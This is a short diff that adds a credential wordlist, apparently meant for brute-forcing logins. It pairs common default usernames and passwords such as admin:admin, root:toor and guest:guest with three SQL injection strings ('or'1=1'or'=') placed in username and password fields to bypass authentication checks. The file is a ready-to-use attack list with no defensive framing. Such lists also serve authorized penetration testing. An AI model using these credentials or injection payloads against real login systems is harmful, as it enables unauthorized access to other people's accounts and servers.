@@ -1,0 +1,14 @@
+anonymous:me@your.com
+or'1=1'or'=':111111
+admin:or'1=1'or'='
+root:or'1=1'or'='
+administrator:password
+test:test
+test:123456
+guest:guest
+admin:123456
+admin:admin
+admin:admin123456
+root:toor
+root:root
+root:secret
